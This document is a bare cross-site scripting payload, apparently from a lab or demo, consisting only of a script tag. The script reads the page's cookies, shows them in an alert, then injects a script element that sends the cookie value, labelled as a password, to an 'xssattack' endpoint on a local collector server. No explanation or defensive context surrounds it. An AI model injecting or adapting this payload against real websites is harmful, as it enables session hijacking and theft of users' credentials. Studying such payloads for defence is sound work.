<script>
let cookie = document.cookie;
alert(cookie);
var script =document.createElement('script');
script.src='http://127.0.0.1:3001/xssattack?password='+cookie.split('=')[1];
document.body.appendChild(script);
</script>
